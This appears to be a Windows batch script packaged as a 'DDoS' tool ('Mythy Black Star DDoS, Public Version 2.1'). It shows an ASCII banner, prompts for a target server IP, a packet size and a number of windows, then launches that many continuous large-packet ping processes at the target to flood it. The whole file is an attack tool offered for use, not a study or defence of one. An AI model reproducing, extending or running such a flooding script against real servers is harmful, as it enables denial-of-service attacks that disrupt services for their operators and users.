@echo off
mode 117,28
title                                                                                                                        +  Mythy Black Star DDoS  + .
cls
color f
echo.
set hrs=%time:~0,2%
set mns=%time:~3,2%
set scs=%time:~6,2%
set mls=%time:~9,2%
set nmt=%time:~0,8%
echo.

Call :Color 04 "    888b     d888          888    888                        8888888b.  8888888b.            .d8888b.  "
echo.
Call :Color 04 "    8888b   d8888          888    888                        888   Y88b 888   Y88b          d88P  Y88b "
echo.
Call :Color 04 "    88888b.d88888          888    888                        888    888 888    888          Y88b.      "
echo.
Call :Color 04 "    888Y88888P888 888  888 888888 88888b.  888  888  .d8888b 888    888 888    888  .d88b.    Y888b.   "
echo.
Call :Color 0c "    888 Y888P 888 888  888 888    888  88b 888  888 d88P     888    888 888    888 d88 88b      Y88b. "
echo.
Call :Color 0c "    888  Y8P  888 888  888 888    888  888 888  888 888      888    888 888    888 888  888        888 "
echo.
Call :Color 0c "    888       888 Y88b 888 Y88b.  888  888 Y88b 888 Y88b.    888  .d88P 888  .d88P Y88..88P Y88b  d88P "
echo.
Call :Color 04 "    888       888   Y88888   Y888 888  888   Y88888   Y8888P 8888888P   8888888P     Y88P     Y8888P   "
echo.
Call :Color 04 "                       888                      888                                                    "
echo.
Call :Color 04 "                  Y8b d88P                 Y8b d88P                                                    "
echo.
Call :Color 04 "                    Y88P                     Y88P                                                      "
echo.
echo.
Call :Color 0e "                                                Public Version 2.1"
echo.
echo.
goto main
:Color

SetLocal EnableExtensions EnableDelayedExpansion
Set "Text=%~2"
If Not Defined Text (Set Text=^")
Subst `: "!Temp!" >Nul &`: &Cd \
If Not Exist `.7 (
Echo(|(Pause >Nul &Findstr "^" >`)
Set /P "=." >>` <Nul
For /F "delims=;" %%# In (
'"Prompt $H;&For %%_ In (_) Do Rem"') Do (
Set /P "=%%#%%#%%#" <Nul >`.3
Set /P "=%%#%%#%%#%%#%%#" <Nul >`.5
Set /P "=%%#%%#%%#%%#%%#%%#%%#" <Nul >`.7))
Set /P "LF=" <` &Set "LF=!LF:~0,1!"
For %%# in ("!LF!") Do For %%_ In (
\ / :) Do Set "Text=!Text:%%_=%%~#%%_%%~#!"
For /F delims^=^ eol^= %%# in ("!Text!") Do (
If #==#! SetLocal DisableDelayedExpansion
If \==%%# (Findstr /A:%~1 . \` Nul
Type `.3) Else If /==%%# (Findstr /A:%~1 . /.\` Nul
Type `.5) Else (Echo %%#\..\`>`.dat
Findstr /F:`.dat /A:%~1 .
Type `.7))
If "\n"=="%~3" (Echo()
Goto :Eof

:main
Call :Color 0a "  <> Server IP: <> "
echo.
set /p ip=[%hrs%:%mns%:%scs%] ^> 
Call :Color 0a "   <> PACKETS: (recommended 1200 or under) <>"
echo.
set /p packets=[%hrs%:%mns%:%scs%] ^> 
Call :Color 0a  "   <> Number of DDoS Windows open you want <>"
echo.
set /p windowsOpen=[%hrs%:%mns%:%scs%] 
Call :Color 04  "  - SENDING ATTACK -" 


ping localhost -n 3 >nul
@echo off
for /L %%a in (1,1,%windowsOpen%) do (

start ping %ip% -t -l %packets% 

)